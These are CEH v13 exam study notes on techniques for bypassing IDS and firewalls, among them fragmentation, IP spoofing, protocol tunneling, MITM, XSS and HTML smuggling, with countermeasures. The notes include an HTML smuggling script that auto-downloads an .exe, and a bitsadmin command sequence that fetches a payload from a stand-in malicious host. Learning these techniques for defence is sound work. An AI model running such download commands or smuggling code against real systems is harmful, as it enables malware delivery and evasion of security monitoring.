# CEH v13 - Module 12: Evading IDS, Firewalls, and Honeypots
## 03 - Different Techniques To Bypass IDS/Firewalls

### Overview
This section covers various techniques used to bypass Intrusion Detection Systems (IDS) and Firewalls. Understanding these methods is crucial for ethical hackers to test security controls and for security professionals to implement appropriate countermeasures.

**Important Note:** These techniques are covered for educational and defensive purposes as part of CEH v13 certification training.

---

## 1. IDS & Firewall Identification

Before attempting to bypass security controls, attackers first identify their presence and configuration.

### A. Port Scanning

**Purpose:** Identify open ports and services while detecting firewall presence

#### Detection Methods:
- **Response Analysis:** Different responses indicate firewall presence
  - **Filtered Ports:** No response (dropped by firewall)
  - **Closed Ports:** RST packet returned
  - **Open Ports:** SYN-ACK response
  
#### Stealth Scanning Techniques:
- **SYN Stealth Scan:** Half-open connections to avoid logging
- **FIN Scan:** Uses FIN flag to probe closed ports
- **NULL Scan:** Packets with no flags set
- **Xmas Scan:** Packets with FIN, PSH, and URG flags set

#### Timing-Based Detection:
- **Slow Scan:** Reduce scan rate to avoid detection thresholds
- **Randomized Timing:** Irregular intervals between probes
- **Decoy Scanning:** Use multiple source IPs to mask real attacker

### B. Firewalking

**Definition:** Technique to determine ACL (Access Control List) configurations on packet-filtering firewalls

#### Process:
1. **Traceroute Analysis:** Map network topology beyond firewall
2. **TTL Manipulation:** Set TTL to expire just beyond firewall
3. **Response Analysis:** ICMP time exceeded messages reveal filtering rules
4. **Port Probing:** Test specific ports through firewall

#### Key Indicators:
- **Filtered Packets:** No response from target
- **Allowed Packets:** Normal traceroute response
- **Blocked Protocols:** ICMP filtering detection

### C. Banner Grabbing

**Purpose:** Identify firewall/security device types and versions

#### Methods:
- **Telnet Banner Grabbing:** Connect to services and capture banners
- **HTTP Header Analysis:** Examine server headers for security devices
- **SNMP Queries:** Extract device information if SNMP is enabled
- **Error Message Analysis:** Analyze error responses for device signatures

#### Common Banners:
- **Cisco ASA:** Specific login prompts and error messages
- **pfSense:** Web interface signatures
- **FortiGate:** Characteristic authentication pages
- **SonicWall:** Unique management interface indicators

---

## 2. IP Address Spoofing

**Definition:** Technique of falsifying the source IP address in packet headers to appear as coming from a trusted source.

### Implementation Methods:

#### A. Basic IP Spoofing:
- **Raw Socket Programming:** Create packets with forged source IPs
- **Tools Usage:** Utilize tools like hping3, Scapy for packet crafting
- **Header Manipulation:** Modify IP header source address field

#### B. Spoofing Techniques:
- **Random Spoofing:** Use completely random source IP addresses
- **Subnet Spoofing:** Use IPs from target's trusted subnet ranges  
- **Blind Spoofing:** Attack without seeing responses (one-way communication)
- **Non-Blind Spoofing:** Attack where attacker can see responses

### Limitations:
- **Stateful Firewalls:** Track connection states, making spoofing difficult
- **Ingress/Egress Filtering:** ISPs filter packets with invalid source IPs
- **TCP Sequence Numbers:** TCP connections require proper sequence handling
- **Routing Issues:** Response packets go to spoofed address, not attacker

---

## 3. Source Routing

**Definition:** IP option that allows sender to specify the route packets should take through the network, bypassing normal routing decisions.

### Types of Source Routing:

#### A. Loose Source Routing (LSR):
- Specifies some intermediate routers in the path
- Routers can choose best path between specified points
- More flexible but less control

#### B. Strict Source Routing (SSR):
- Specifies exact path through all intermediate routers
- Packets must follow exact route specified
- Complete control but inflexible

### Bypass Mechanism:
- **Firewall Circumvention:** Route packets through trusted networks
- **Access Control Evasion:** Bypass IP-based filtering rules
- **Geographic Restrictions:** Route through allowed countries/regions
- **Load Balancer Evasion:** Bypass load balancing mechanisms

### Countermeasures:
- **Disable Source Routing:** Most modern systems disable by default
- **Router Configuration:** Block source-routed packets at boundaries
- **Firewall Rules:** Drop packets with source routing options
- **IDS Signatures:** Detect and alert on source routing attempts

---

## 4. Tiny Fragments (Fragmentation Attacks)

**Definition:** Technique that splits malicious packets into very small fragments to evade detection by security devices that don't properly reassemble packets.

### Attack Methodology:

#### A. Fragment Overlap Attacks:
- **Overlapping Fragments:** Create fragments that overlap in reassembly
- **Data Corruption:** Overwrite critical data during reassembly
- **Evasion Mechanism:** Different reassembly algorithms cause confusion

#### B. Tiny Fragment Attack:
- **Small Initial Fragment:** First fragment contains minimal TCP header
- **Subsequent Fragments:** Contain the actual payload
- **Filter Evasion:** Firewalls only check first fragment for rules

#### C. Fragment Timeout Attacks:
- **Delayed Fragments:** Send fragments with large time gaps
- **Resource Exhaustion:** Cause systems to hold fragments in memory
- **Reassembly Issues:** Exploit timeout handling differences

### Technical Implementation:
- **Fragment Size:** Reduce fragments to minimum possible size (8 bytes)
- **Fragment Offset:** Manipulate offset values for overlap attacks
- **Fragment Flags:** Use More Fragments (MF) and Don't Fragment (DF) flags
- **Protocol Exploitation:** Target UDP and ICMP protocols primarily

---

## 5. Using IP Address in Place of URL

**Definition:** Technique to bypass URL-based filtering by using direct IP addresses instead of domain names.

### Implementation Methods:

#### A. Direct IP Access:
- **Decimal Notation:** http://192.168.1.100 instead of http://example.com
- **Hexadecimal Notation:** http://0xC0A80164 (hex equivalent)
- **Octal Notation:** http://0300.0250.0001.0144 (octal equivalent)
- **Integer Notation:** http://3232235876 (32-bit integer)

#### B. Mixed Notation:
- **Combination Methods:** Mix different IP representations
- **Obfuscation Techniques:** Make IP addresses less recognizable
- **Unicode Encoding:** Use Unicode characters in URLs

### Bypass Scenarios:
- **URL Filtering:** Bypass category-based web filtering
- **Blacklist Evasion:** Circumvent domain-based blocking
- **Content Filtering:** Access restricted websites directly
- **Proxy Bypass:** Avoid proxy server restrictions

---

## 6. Using Proxy Server

**Definition:** Technique using intermediate servers to hide the true source of network traffic and bypass access controls.

### Types of Proxy Usage:

#### A. Anonymous Proxies:
- **HTTP Proxies:** Standard web traffic proxying
- **SOCKS Proxies:** Generic proxy protocol for any traffic
- **Elite Proxies:** Highest anonymity level proxies
- **Transparent Proxies:** Client unaware of proxy presence

#### B. Proxy Chaining:
- **Multiple Proxy Layers:** Route traffic through several proxies
- **Geographic Distribution:** Use proxies in different countries
- **Protocol Mixing:** Combine different proxy types
- **Tor Network:** Use onion routing for maximum anonymity

### Bypass Applications:
- **IP-Based Filtering:** Change apparent source IP address
- **Geographic Restrictions:** Appear to originate from allowed regions
- **Bandwidth Limitations:** Distribute traffic across multiple connections
- **Content Filtering:** Access blocked content through proxy

---

## 7. ICMP Tunneling

**Definition:** Technique of encapsulating other protocols within ICMP packets to bypass firewall restrictions.

### Implementation Methods:

#### A. ICMP Echo Tunneling:
- **Data Embedding:** Hide data in ICMP echo request/reply packets
- **Payload Manipulation:** Use ICMP data section for covert communication
- **Size Variations:** Vary packet sizes to avoid pattern detection
- **Timing Control:** Adjust timing to appear like normal ping traffic

#### B. ICMP Error Message Tunneling:
- **Error Code Abuse:** Use ICMP error messages to carry data
- **Type Field Manipulation:** Modify ICMP type and code fields
- **Fragmentation Required:** Abuse ICMP fragmentation messages
- **Time Exceeded:** Use time exceeded messages for tunneling

### Tools and Techniques:
- **ptunnel:** Popular ICMP tunneling tool
- **icmptunnel:** Lightweight ICMP tunnel implementation
- **Hans:** ICMP tunnel with authentication features
- **Custom Scripts:** Develop specific ICMP tunneling solutions

---

## 8. ACK Tunneling and HTTP Tunneling

### A. ACK Tunneling

**Definition:** Technique using TCP ACK packets to bypass firewall rules that allow established connections.

#### Mechanism:
- **ACK Flag Set:** Send packets with ACK flag to appear as established connections
- **Stateless Firewalls:** Exploit firewalls that don't track connection states
- **Response Analysis:** Analyze responses to map firewall rules
- **Data Embedding:** Hide data in TCP options or payload

#### Limitations:
- **Stateful Firewalls:** Modern firewalls track connection states
- **Sequence Number Checking:** Proper sequence numbers required
- **Limited Payload:** Restricted data transmission capabilities
- **Detection Signatures:** IDS systems detect unusual ACK patterns

### B. HTTP Tunneling

**Definition:** Technique of encapsulating other protocols within HTTP traffic to bypass application-layer restrictions.

#### Implementation Methods:
- **HTTP GET/POST:** Embed data in HTTP request methods
- **URL Encoding:** Hide data in URL parameters and paths
- **HTTP Headers:** Use custom headers for data transmission
- **WebSocket Upgrade:** Establish persistent connections through HTTP

#### Common Tools:
- **HTTPTunnel:** Classic HTTP tunneling tool
- **Stunnel:** SSL/TLS tunnel with HTTP support
- **Proxytunnel:** HTTP proxy tunneling utility
- **Custom Web Applications:** Develop specific HTTP tunnel services

---

## 9. SSH and DNS Tunneling

### A. SSH Tunneling

**Definition:** Attackers use OpenSSH to encrypt and tunnel all traffic from a local machine to a remote machine to avoid detection by perimeter security controls.

#### Types of SSH Tunneling:
- **Local Port Forwarding:** Forward local ports through SSH connection
- **Remote Port Forwarding:** Forward remote ports back to local machine
- **Dynamic Port Forwarding:** Create SOCKS proxy through SSH
- **VPN over SSH:** Create virtual private networks using SSH

#### Implementation Commands:
- **Local Forwarding:** `ssh -L localport:targethost:targetport user@sshserver`
- **Remote Forwarding:** `ssh -R remoteport:localhost:localport user@sshserver`
- **Dynamic Forwarding:** `ssh -D proxyport user@sshserver`
- **Background Mode:** Use `-f` and `-N` flags for background tunneling

### B. DNS Tunneling

**Definition:** Attackers make use of DNS server and routing techniques to encapsulate other protocols within DNS queries and responses.

#### Mechanism:
- **DNS Query Encoding:** Embed data in DNS subdomain names
- **DNS Response Encoding:** Hide data in DNS record responses
- **Record Type Abuse:** Use TXT, NULL, or other records for data
- **Recursive Queries:** Use DNS recursion for data transmission

#### Popular Tools:
- **dnscat2:** Advanced DNS tunneling with encryption
- **Iodine:** High-performance DNS tunnel
- **DNSstuff:** Simple DNS tunneling utility
- **dns2tcp:** TCP over DNS tunneling tool

---

## 10. Through External Systems

**Definition:** Techniques using external systems and services to bypass local security controls.

### Methods:

#### A. Cloud Services Abuse:
- **Public Cloud Storage:** Use services like AWS S3, Google Drive for data exfiltration
- **Cloud Functions:** Execute code through serverless platforms
- **SaaS Applications:** Abuse legitimate applications for communication
- **CDN Services:** Use content delivery networks for hosting malicious content

#### B. Third-Party Services:
- **URL Shorteners:** Hide malicious URLs behind legitimate services
- **Translation Services:** Route traffic through translation proxies
- **Web Archives:** Access cached versions of blocked content
- **Social Media Platforms:** Use messaging features for C2 communication

#### C. Mobile Networks:
- **Cellular Data:** Bypass network restrictions using mobile connections
- **Hotspot Sharing:** Route traffic through mobile device hotspots
- **SMS/MMS Tunneling:** Use text messaging for data transmission
- **Mobile Applications:** Abuse legitimate apps for communication

---

## 11. Through MITM Attack

**Definition:** Using Man-in-the-Middle positioning to intercept and manipulate traffic to bypass security controls.

### Implementation Strategies:

#### A. ARP Spoofing:
- **ARP Cache Poisoning:** Redirect traffic through attacker machine
- **Gateway Impersonation:** Pose as network gateway/router
- **Traffic Interception:** Capture and analyze all network traffic
- **Selective Forwarding:** Forward legitimate traffic while blocking security

#### B. DNS Spoofing:
- **DNS Cache Poisoning:** Corrupt DNS resolver caches
- **Rogue DNS Server:** Provide false DNS responses
- **Domain Hijacking:** Redirect legitimate domains to attacker-controlled IPs
- **Local DNS Manipulation:** Modify local DNS configuration

#### C. SSL/TLS Interception:
- **Certificate Substitution:** Replace legitimate certificates with attacker-controlled ones
- **SSL Stripping:** Downgrade HTTPS connections to HTTP
- **Certificate Pinning Bypass:** Circumvent certificate validation
- **Proxy Certificate Installation:** Install root CA certificates

---

## 12. Through Content and XSS Attack

**Definition:** Using web application vulnerabilities to bypass client-side and network security controls.

### Cross-Site Scripting (XSS) Techniques:

#### A. Stored XSS:
- **Database Injection:** Store malicious scripts in application database
- **Persistent Execution:** Scripts execute for all users accessing stored content
- **Administrative Privilege Escalation:** Target administrative interfaces
- **Session Hijacking:** Steal authentication tokens and session cookies

#### B. Reflected XSS:
- **URL Parameter Injection:** Include malicious scripts in URL parameters
- **Social Engineering:** Trick users into clicking malicious links
- **Phishing Integration:** Combine with phishing attacks for credential theft
- **CSRF Token Extraction:** Extract and abuse anti-CSRF tokens

#### C. DOM-based XSS:
- **Client-Side Manipulation:** Modify DOM structure with malicious scripts
- **Browser Exploitation:** Target browser-specific vulnerabilities
- **Local Storage Access:** Access browser local storage and cached data
- **Same-Origin Policy Bypass:** Circumvent browser security restrictions

### Content-based Bypasses:
- **File Upload Abuse:** Upload malicious files through web applications
- **Content-Type Manipulation:** Change MIME types to bypass filters
- **Encoding Techniques:** Use various encoding methods to obfuscate payloads
- **Polyglot Files:** Create files that are valid in multiple formats

---

## 13. Through HTML Smuggling

**Definition:** Technique using HTML5 features to smuggle malicious files past security controls by constructing them within the browser.

### Implementation Methods:

#### A. Client-Side File Construction:
- **JavaScript Blob API:** Create files using browser APIs
- **Base64 Encoding:** Encode malicious content within HTML
- **HTML5 Download Attribute:** Force download of constructed files
- **Data URIs:** Use data: URIs to embed file content

#### B. Evasion Techniques:
- **Fragmented Payloads:** Split malicious content across multiple resources
- **Delayed Execution:** Use timers to delay malicious activity
- **User Interaction Required:** Require user clicks to trigger download
- **Legitimate Site Hosting:** Host smuggling code on trusted domains

### Technical Implementation:
```html
<!-- Example structure (educational purposes only) -->
<script>
  // Base64 encoded payload split across variables
  var part1 = "base64_encoded_content_part1";
  var part2 = "base64_encoded_content_part2";
  
  // Construct blob and trigger download
  var fullContent = atob(part1 + part2);
  var blob = new Blob([fullContent]);
  var url = URL.createObjectURL(blob);
  
  // Automatic download trigger
  var a = document.createElement('a');
  a.href = url;
  a.download = 'filename.exe';
  a.click();
</script>
```

---

## 14. Through Windows BITS

**Definition:** Abuse of Windows Background Intelligent Transfer Service (BITS) to bypass network security controls and download malicious content.

### BITS Functionality:

#### A. Legitimate BITS Features:
- **Background Downloads:** Transfer files without user interaction
- **Bandwidth Throttling:** Automatically adjust download speed
- **Resume Capability:** Resume interrupted downloads
- **Network Awareness:** Pause during network congestion

#### B. Malicious BITS Abuse:
- **Stealth Downloads:** Download malicious files without detection
- **Proxy Bypass:** Use BITS proxy configuration to bypass restrictions
- **Persistence Mechanism:** Schedule recurring downloads
- **Living Off the Land:** Use legitimate Windows service for malicious purposes

### Implementation Commands:
```cmd
REM Create BITS job for malicious download
bitsadmin /create malicious_job
bitsadmin /addfile malicious_job http://malicious.site/payload.exe C:\temp\payload.exe
bitsadmin /setpriority malicious_job HIGH
bitsadmin /resume malicious_job

REM Monitor job status
bitsadmin /info malicious_job

REM Complete and execute
bitsadmin /complete malicious_job
```

### Detection Evasion:
- **HTTP User-Agent Spoofing:** Use legitimate browser user-agent strings
- **Traffic Blending:** Mix malicious downloads with legitimate traffic
- **Timing Manipulation:** Schedule downloads during business hours
- **Size Limitations:** Keep file sizes small to avoid suspicion

---

## Summary for CEH v13 Exam

### Key Points to Remember:

#### High-Priority Techniques (Commonly Tested):
1. **Fragmentation Attacks** - Understanding tiny fragments and overlap attacks
2. **Protocol Tunneling** - SSH, DNS, HTTP, and ICMP tunneling methods
3. **IP Spoofing** - Source IP manipulation and limitations
4. **Proxy Usage** - Anonymous proxies and proxy chaining
5. **Firewall Identification** - Port scanning and firewalking techniques

#### Medium-Priority Techniques:
1. **Source Routing** - LSR vs SSR and modern limitations
2. **Banner Grabbing** - Device identification methods
3. **ACK Tunneling** - Stateless firewall exploitation
4. **MITM Attacks** - ARP and DNS spoofing for bypass
5. **Content-based Attacks** - XSS and file upload abuse

#### Emerging Techniques (CEH v13 Updates):
1. **HTML Smuggling** - Browser-based file construction
2. **Windows BITS Abuse** - Living off the land techniques
3. **Cloud Service Abuse** - Using legitimate services for malicious purposes
4. **Mobile Network Bypasses** - Alternative connectivity methods

### Exam Tips:
- **Understand Limitations:** Know when techniques work and when they don't
- **Tool Recognition:** Identify tools associated with each technique  
- **Countermeasures:** Understand defensive measures for each attack
- **Real-world Application:** Focus on practical implementation scenarios
- **Modern Context:** Consider how techniques apply to current network architectures

---

**Note:** This comprehensive overview covers the bypass techniques essential for CEH v13 exam success. Each technique should be understood from both offensive and defensive perspectives, with emphasis on ethical application and countermeasure implementation.
